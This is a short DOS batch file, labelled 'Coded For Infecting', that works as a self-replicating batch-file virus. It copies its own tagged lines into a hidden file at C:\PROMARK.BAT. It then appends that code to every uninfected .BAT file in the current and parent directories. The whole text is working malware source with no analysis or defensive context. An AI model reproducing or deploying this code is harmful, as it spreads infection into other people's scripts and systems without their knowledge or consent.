rem Coded For Infecting (BY PROMARK)
@echo off%[PROMARK]%
if '%PROMARK%=='11 goto PROMARK2
if '%2=='_ goto PROMARK1
if exist C:\PROMARK.BAT goto PROMARK
if not exist %0.BAT goto PROMARK2
find "PROMARK"<%0.BAT>C:\PROMARK.BAT
attrib C:\PROMARK.BAT +h
:PROMARK
for %%v in (*.BAT ..\*.BAT) do call C:\PROMARK %%v _
set PROMARK=
goto PROMARK2
:PROMARK1
find /i "PROMARK"<%1>nul
if not errorlevel 1 goto PROMARK2
type C:\PROMARK.BAT>>%1
set PROMARK=%PROMARK%1
:PROMARK2